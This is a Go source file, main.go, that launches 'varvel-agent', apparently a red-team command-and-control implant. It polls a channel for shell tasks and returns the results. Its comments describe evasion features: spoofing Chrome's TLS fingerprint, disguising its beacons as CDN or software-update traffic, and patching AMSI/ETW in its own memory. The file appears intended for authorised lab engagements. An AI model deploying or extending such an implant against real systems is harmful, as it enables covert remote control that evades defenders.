//go:build !varveldll

// main.go — varvel-agent: the native (compiled) agent tier for VARVEL's governed
// callback channel. It speaks the EXISTING plaintext http wire (/c pull, /r push,
// HMAC(token, id:seq:...) auth, strict agent-global seq, 204-uniform rejections,
// server-side kill-list) — the same contract as the reference sim agent, minus the
// transports and gated tiers this minimal tier honestly does not implement.
//
//	varvel-agent.exe -url http://127.0.0.1:PORT -id AGENTID -token TOKEN
//	  [-interval 2000] [-jitter 1500] [-tls-profile chrome] [-once] [-dir SANDBOX]
//	  [-tls-insecure] [-enc] [-shape plain] [-allow-evasion]
//
// Flags (sim-agent parity where they overlap):
//   -url          channel base URL (required). http:// = the plaintext wire;
//                 https:// = dial through the -tls-profile ClientHello.
//   -id           enrolled agent id (issued channel-side at registration — there is
//                 NO wire enrollment; id+token arrive out-of-band, by design).
//   -token        the 128-bit channel token. Required. (CLI args are visible in the
//                 process list — the same caveat the sim agent documents.)
//   -interval     base poll gap ms (default 2000; floor 200 — sim-agent parity).
//   -jitter       ± uniform jitter ms (default 1500).
//   -tls-profile  chrome (default: uTLS HelloChrome_Auto) | go-native (stock Go).
//   -once         one pull/exec/push cycle, then exit (tests and dry runs).
//   -dir          sandbox dir for shell cwd (default ./.native-<id>, sim-agent parity).
//   -tls-insecure skip TLS server-cert verification (LAB ONLY: the range's self-signed
//                 fixtures. Loud at launch; never default).
//   -enc          envelope encryption (engine/envelope.mjs; sim-agent --enc parity):
//                 AEAD-seal all result content end-to-end, advertise the capability
//                 (x-varvel-enc: 1) on every pull, and REQUIRE sealed task replies —
//                 a plaintext reply is a downgrade, refused loudly, never tasked from.
//                 Default OFF; the channel's enc.mode gates the listener half.
//   -shape        launch-time wire shape (engine/malleable.mjs v2; sim-agent
//                 x-varvel-shape parity): plain (default) | cdn-asset |
//                 software-update | telemetry-beacon. Adopts the profile's shaped
//                 paths, ORDERED header set (JA4H-correct — shapehttp.go), cadence
//                 model, batch windows and padding. A channel-delivered
//                 x-varvel-shape re-shapes (or clears) the agent live.
//   -allow-evasion  agent-side half of the EVASION tier's double gate (default OFF;
//                 sim-agent --evasion / PS-agent -AllowEvasion parity): permits the
//                 evasion-enable / evasion-restore / evasion-status task kinds to
//                 patch THIS agent's OWN process memory (amsi/etw recipes,
//                 evasion_windows.go). The engagement's exec.evasion setting is the
//                 channel-side half; BOTH must say yes or nothing is ever patched.
//
// Logs go to stderr; stdout stays quiet (an operator pipe never eats protocol noise).
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"
)

func shapeName(s *ShapeProfile) string {
	if s == nil {
		return "plain"
	}
	return s.Name
}

func main() {
	var (
		url       = flag.String("url", "", "channel base URL (required)")
		id        = flag.String("id", "", "enrolled agent id (required)")
		token     = flag.String("token", "", "channel token (required)")
		interval  = flag.Int("interval", 2000, "base poll gap ms (floor 200)")
		jitter    = flag.Int("jitter", 1500, "± uniform jitter ms")
		profile   = flag.String("tls-profile", ProfileChrome, "TLS ClientHello profile: chrome | go-native")
		once      = flag.Bool("once", false, "single pull/exec/push cycle, then exit")
		dir       = flag.String("dir", "", "sandbox dir (default ./.native-<id>)")
		insecure  = flag.Bool("tls-insecure", false, "skip TLS server-cert verification (LAB ONLY)")
		enc       = flag.Bool("enc", false, "envelope encryption: seal results, advertise x-varvel-enc, require sealed task replies")
		shape     = flag.String("shape", "", "wire shape profile at launch: plain | cdn-asset | software-update | telemetry-beacon (a channel-delivered x-varvel-shape re-shapes live)")
		evasionOK = flag.Bool("allow-evasion", false, "permit evasion-* task kinds to patch THIS process (amsi/etw); the engagement exec.evasion gate must also be on")
	)
	flag.Parse()

	if *url == "" || *id == "" || *token == "" {
		fmt.Fprintln(os.Stderr, "varvel-agent needs -url, -id and -token (id+token are issued channel-side at registration)")
		flag.Usage()
		os.Exit(2)
	}
	launchShape, err := shapeByName(*shape)
	if err != nil {
		log.Fatalf("%v", err) // honest refusal — never silently reshape
	}
	if *insecure {
		log.Printf("WARNING: -tls-insecure is set — server certificates are NOT verified (lab fixtures only)")
	}

	sandbox := *dir
	if sandbox == "" {
		sandbox = defaultSandbox(*id)
	}
	absSandbox, err := filepath.Abs(sandbox)
	if err != nil {
		log.Fatalf("sandbox dir: %v", err)
	}
	if err := os.MkdirAll(absSandbox, 0o755); err != nil {
		log.Fatalf("sandbox dir: %v", err)
	}

	client, err := httpClient(*url, *profile, *insecure)
	if err != nil {
		log.Fatalf("%v", err)
	}

	a := &Agent{
		URL:      trimTrailingSlash(*url),
		ID:       *id,
		Token:    *token,
		Dir:      absSandbox,
		Interval: time.Duration(maxInt(*interval, minGapMs)) * time.Millisecond,
		Jitter:   time.Duration(maxInt(*jitter, 0)) * time.Millisecond,
		Client:   client,
		Enc:         *enc,
		Shape:       launchShape,
		TLSProfile:  *profile,
		TLSInsecure: *insecure,
		AllowEvasion: *evasionOK,
	}
	if launchShape != nil {
		a.ShapeAt = time.Now().UnixMilli() // launch anchor; a channel delivery re-anchors live
	}

	log.Printf("varvel-agent %s → %s · sandbox %s · cadence %d±%dms · tls-profile %s · enc %v · shape %s · evasion %s",
		a.ID, a.URL, a.Dir, *interval, *jitter, *profile, a.Enc, shapeName(launchShape), evasionArmState(a.AllowEvasion))

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	defer a.stop()
	a.run(ctx, *once)
}
